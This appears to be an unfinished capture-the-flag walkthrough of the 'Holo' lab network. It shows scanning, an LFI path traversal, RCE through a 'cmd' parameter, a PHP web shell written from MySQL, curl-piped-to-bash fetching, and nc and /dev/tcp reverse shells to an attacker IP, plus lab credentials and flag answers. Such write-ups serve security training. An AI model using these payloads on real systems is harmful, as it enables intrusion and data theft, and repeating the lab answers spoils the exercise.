# Holo - Hard

1. [Flag Submission Panel](#flag-submission-panel)
2. [.NET Basics](#net-basics)
3. [Initial Recon](#initial-recon)
4. [Web App Exploitation - 1](#web-app-exploitation---1)
5. [Post Exploitation - 1](#post-exploitation---1)
6. [Situational Awareness - 1](#situational-awareness---1)
7. [Docker Breakout](#docker-breakout)
8. [Privilege Escalation - 1](#privilege-escalation---1)
9. [Post Exploitation - 2](#post-exploitation---2)
10. [Pivoting](#pivoting)
11. [Command and Control](#command-and-control)
12. [Web App Exploitation - 2](#web-app-exploitation---2)
13. [AV Evasion](#av-evasion)
14. [Post Exploitation - 3](#post-exploitation---3)
15. [Situtational Awareness - 2](#situational-awareness---2)
16. [Privilege Escalation - 2](#privilege-escalation---2)
17. [Persistence](#persistence)
18. [NTLM Relay](#ntlm-relay)

## Flag Submission Panel

```markdown
1. What flag can be found inside of the container? - HOLO{175d7322f8fc53392a417ccde356c3fe}

2. What flag can be found after gaining user on L-SRV01? - HOLO{3792d7d80c4dcabb8a533afddf06f666}

3. What flag can be found after rooting L-SRV01?

4. What flag can be found on the Web Application on S-SRV01?

5. What flag can be found after rooting S-SRV01?

6. What flag can be found after gaining user on PC-FILESRV01?

7. What flag can be found after rooting PC-FILESRV01?

8. What flag can be found after rooting DC-SRV01?
```

## .NET Basics

* Many Windows apps are built in C# and its underlying tech, .NET - this allows devs to interact with CLR (Common Language Runtime) and Win32 API.

* CLR is the run-time environment used by .NET; any .NET language (C#, PowerShell, etc.) can be used to compile into CIL (Common Intermediary Language).

* .NET consists of 2 different branches:

  * .NET framework (only Windows)
  * .NET core (cross-compatible)

* The main component of .NET is .NET assemblies, which are compiled .exes and .dlls that any .NET language can execute.

* In order to create a solution file for .NET core in ```Visual Studio```, navigate to 'Create a new project' > Console App (.NET Core) > Configure project name, location, solution name - this creates a C# file.

* To build a solution file, navigate to Build > Build Solution.

## Initial Recon

```shell
nmap -sV -sC -p- -v 10.200.107.0/24
#scan given range

#two hosts are up

#we need to scan web server
nmap -sV -sC -p- -v 10.200.107.33

#aggressive scan for only open ports
nmap -A -p 22,80,33060 -v 10.200.107.33
```

* It is given that our scope of engagement is 10.200.x.0/24 and 192.168.100.0/24 - we can scan the ranges provided.

* As the public-facing web server is up at 10.200.107.33, we can scan all ports.

* Open ports and services:

  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29
  * 33060 - mysqlx

```markdown
1. What is the last octet of the IP address of the public-facing web server? - 33

2. How many ports are open on the web server? - 3

3. What CME is running on port 80 of the web server? - wordpress

4. What version of the CME is running on port 80 of the web server? - 5.5.3

5. What is the HTTP title of the web server? - holo.live
```

## Web App Exploitation - 1

```shell
sudo vim /etc/hosts
#map holo.live to L-SRV01 IP

wfuzz -u holo.live -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.holo.live"
#vhost fuzzing

#filter out false positives
wfuzz -u holo.live -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.holo.live" --hw 1402

sudo vim /etc/hosts
#add enumerated subdomains

gobuster dir -u www.holo.live -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml

gobuster dir -u dev.holo.live -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml

gobuster dir -u admin.holo.live -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml

#using LFI in dev page, get creds
#log into admin dashboard

#check for RCE by fuzzing in admin page
wfuzz -u http://admin.holo.live/dashboard.php?FUZZ=ls+-la -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

#filter responses with certain word size
wfuzz -u http://admin.holo.live/dashboard.php?FUZZ=ls+-la -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hw 0
#this gives us a valid parameter

#we now have rce on admin dashboard page
```

* After adding the IP address of L-SRV01 and the domain to '/etc/hosts' file, we can use ```gobuster``` or ```wfuzz``` to check for virtual hosts.

* After running ```wfuzz```, we get some subdomains, which can be inspected further by adding them to '/etc/hosts'.

* Now, in the discovered subdomains, we need to scan the web directories to check for interesting files - we can use ```gobuster``` for this.

* Scanning the web directories shows that we have 'robots.txt' file in the subdomains 'www.holo.live' and 'admin.holo.live'.

* For the first subdomain, 'robots.txt' discloses the web server's current directory as ```/var/www/wordpress```.

* For the admin subdomain, 'robots.txt' contains a few disallowed files - one of them includes a .txt file which could contain creds.

* We cannot access this file, but now we have the directory disclosure here for admin subdomain as ```/var/www/admin```.

* Now, we can see that in the subdomain 'dev.holo.live', the images are loaded using 'img.php' file; however, it makes use of the 'file' parameter to do so:

  ```http://dev.holo.live/img.php?file=images/korone.jpg```

* This could be vulnerable to Local File Inclusion due to the presence of parameters; we can attempt to check for directory traversal here.

* For example, on the development domain, using Burp Suite's Repeater with this request, we can access ```/etc/passwd``` file:

  ```/img.php?file=../../../etc/passwd```

* Now, we can access the .txt file found earlier from the admin subdomain - this gives us the creds required for logging into the admin page.

* The admin page shows a dashboard - we can check for ways to get a shell on the target now.

* Here, we can attempt to identify RCE by fuzzing for a vulnerable parameter using ```wfuzz```.

* Using the parameter 'cmd', we get a valid response - we now have RCE on L-SRV01.

* Running the ```id``` command shows us that we are running commands as 'www-data'.

```markdown
1. What domains loads images on the first web page? - www.holo.live

2. What are the two other domains present on the web server? - admin.holo.live,dev.holo.live

3. What file leaks the web server's current directory? - robots.txt

4. What file loads images for the development domain? - img.php

5. What is the full path of the credentials file on the administrator domain? - /var/www/admin/supersecretdir/creds.txt

6. What file is vulnerable to LFI on the development domain? - img.php

7. What parameter in the file is vulnerable to LFI? - file

8. What file found from the information leak returns an HTTP error code 403 on the administrator domain? - /var/www/admin/supersecretdir/creds.txt

9. Using LFI on the development domain read the above file. What are the credentials found from the file? - admin:DBManagerLogin!

10. What file is vulnerable to RCE on the administrator domain? - dashboard.php

11. What parameter is vulnerable to RCE on the administrator domain? - cmd

12. What user is the web server running as? - www-data
```

## Post Exploitation - 1

```shell
nc -nvlp 4444

#use reverse-shell one-liner in RCE
#using the nc binary

#we get reverse shell
id

#upgrade to fully interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

#Ctrl+Z to background shell

stty raw -echo; fg
#press Enter twice

#we have upgraded shell
ls
```

* As we have RCE now, we can use that to get a reverse shell.

* After setting up a listener, we can make use of ```nc``` binary present on the target machine to get reverse shell:

  ```http://admin.holo.live/dashboard.php?cmd=which%20nc```

  ```http://admin.holo.live/dashboard.php?cmd=/bin/nc -c sh 10.50.103.238 4444```

* We can now upgrade this to a fully interactive TTY shell.

## Situational Awareness - 1

```shell
#in reverse shell on L-SRV01
hostname
#random hostname

ls -la /
#includes .dockerenv

cat /proc/1/cgroup
#includes docker in the paths provided

ls -la /var/www
#includes flag

cd /tmp

#create a primitive port scanner
vi port-scan.sh

chmod +x port-scan.sh

./port-scan.sh
#shows open ports

#port 3306 is open
#it could be running mysql

#check for mysql creds
find / -name db_connect.php 2>/dev/null

cat /var/www/admin/db_connect.php
#this contains creds

mysql -u admin -p -h 192.168.100.1
#log into mysql

#in mysql
show databases;

use DashboardDB;

show tables;

select * from users;
#print all columns of table
```

```shell
#!/bin/bash
ports=(21 22 53 80 443 3306 8443 8080)
for port in ${ports[@]}; do
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/192.168.100.1/$port && echo $port is open || /dev/null" 
done
```

* Using ```hostname``` we can see that it is a random string - this shows that we could be inside a Docker environment.

* We can confirm this by checking for '.dockerenv' file in the root directory, and by checking the contents of the file ```/proc/1/cgroup``` - this contains 'docker' in its paths.

* We can get the first flag from ```/var/www``` directory.

* Now, as a part of situational awareness, ```ifconfig``` shows that our IP is 192.168.100.100

* Therefore, following the format, we know that the gateway for the Docker container would be 192.168.100.1

* Now, we can build a primitive bash port-scanner script to scan internal ports.

* Scanning these ports on the Docker container gateway shows that ports 22,80,3306 and 8080 are open.

* Port 3306 usually runs a database service like ```mysql``` - we need to check for creds.

* Checking for the common file 'db_connect.php', we can see that it is located in ```/var/www/admin```.

* This gives us the server address of the remote database, creds "admin:!123SecureAdminDashboard321!" and database name.

* We can use this info to log into ```mysql``` - we need to access 'DashboardDB'.

* This contains a 'users' table which gives us the creds "admin:DBManagerLogin!" and "gurag:AAAA"

```markdown
1. What is the Default Gateway for the Docker Container? - 192.168.100.1

2. What is the high web port open in the container gateway? - 8080

3. What is the low database port open in the container gateway? - 3306

4. What is the server address of the remote database? - 192.168.100.1

5. What is the password of the remote database? - !123SecureAdminDashboard321!

6. What is the username of the remote database? - admin

7. What is the database name of the remote database? - DashboardDB

8. What username can be found within the database itself? - gurag
```

## Docker Breakout

```shell
#we have access to remote database
#we can exploit it by injection

#injects PHP code into table
#and saves table to file on remote system
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell-sv.php';
```

```shell
#now we can use curl
#to get RCE

#exit mysql

curl 192.168.100.1:8080/shell-sv.php?cmd=id
#www-data

#on attacker machine
#create shellscript for reverse shell
vim shellscript.sh

python3 -m http.server 80

#setup listener
nc -nvlp 53

#in victim machine rce
#execute url-encoded command
curl 'http://192.168.100.1:8080/shell-sv.php?cmd=curl%20http%3A%2F%2F10.50.103.238%3A80%2Fshellscript.sh%7Cbash%20%26'
#this gives us reverse shell on listener

cat /var/www/user.txt
#get flag
```

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.50.103.238/53 0>&1
```

* According to given info, we can attempt to escape the container by exploiting the remote database.

* The methodology to be followed is:

  * Access remote database using admin creds
  
  * Create new table in main database

  * Inject PHP code to gain command execution

  * Drop table contents onto a file the user can access

  * Execute and obtain RCE on host

* After running the injection command in ```mysql```, we can exit it and use ```curl``` for RCE.

* We can now use this RCE to get a stable reverse shell on the box; we will use a shell script for this, hosted from attacker machine.

* This would be executed from the RCE on target box so as to get reverse shell on our listener; we can use ```curl``` to execute it:

  ```curl http://10.50.103.238:80/shellscript.sh|bash &```

* We need to URL-encode this command before passing it as parameter to the RCE command.

* We can get the user flag from the L-SRV01 box.

```markdown
1. What user is the database running as? - www-data
```

## Privilege Escalation - 1

```shell
```

```markdown
1. What is the full path of the binary with an SUID bit set on L-SRV01?

2. What is the full first line of the exploit for the SUID bit?
```

## Post Exploitation - 2

```markdown
1. What non-default user can we find in the shadow file on L-SRV01?

2. What is the plaintext cracked password from the shadow hash?
```

## Pivoting

## Command and Control

## Web App Exploitation - 2

```markdown
1. What user can we control for a password reset on S-SRV01?

2. What is the name of the cookie intercepted on S-SRV01?

3. What is the size of the cookie intercepted on S-SRV01?

4. What page does the reset redirect you to when successfully authenticated on S-SRV01?
```

## AV Evasion

## Post Exploitation - 3

```markdown
1. What domain user's credentials can we dump on S-SRV01?

2. What is the domain user's password that we can dump on S-SRV01?

3. What is the hostname of the remote endpoint we can authenticate to?
```

## Situational Awareness - 2

```markdown
1. What anti-malware product is employed on PC-FILESRV01?

2. What anti-virus product is employed on PC-FILESRV01?

3. What CLR version is installed on PC-FILESRV01?

4. What PowerShell version is installed on PC-FILESRV01?

5. What Windows build is PC-FILESRV01 running on?
```

## Privilege Escalation - 2

```markdown
1. What is the name of the vulnerable application found on PC-FILESRV01?
```

## Persistence

```markdown
1. What is the first listed vulnerable DLL located in the Windows folder from the application?
```

## NTLM Relay

```markdown
1. What host has SMB signing disabled?
```
